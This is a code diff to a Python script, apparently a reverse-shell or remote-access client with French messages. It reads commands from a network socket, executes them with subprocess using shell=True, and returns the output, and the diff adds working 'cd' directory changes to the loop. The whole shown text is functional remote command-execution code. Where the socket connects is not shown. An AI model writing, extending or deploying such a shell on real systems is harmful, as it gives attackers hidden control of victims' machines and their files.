@@ -39,8 +39,17 @@ while True:
     commande= commande_data.decode()
     print("Commande : ", commande)
 
+    commande_split= commande.split(" ")
+
     if commande == "infos":
         reponse= platform.platform() +" " + os.getcwd()
+         
+    elif len(commande_split) ==2  and commande_split[0] =="cd":
+        try:
+            os.chdir((commande_split[1]).strip("'"))
+            reponse = " "
+        except FileNotFoundError:
+            reponse = "ERREUR : ce répertoire n'existe pas"
     else:
         resultat = subprocess.run(commande,shell=True,
         capture_output=True, universal_newlines=True)
@@ -49,10 +58,12 @@ while True:
         if not reponse or len(reponse)==0:
             reponse = " "
 
+    data_len = len(reponse.encode())
     header = str(len(reponse.encode())).zfill(13)
     print('header:', header)
-    s.sendall(header.encode())    
-    s.sendall(reponse.encode())
+    s.sendall(header.encode())  
+    if data_len > 0 :  
+        s.sendall(reponse.encode())
 
 s.close()
 
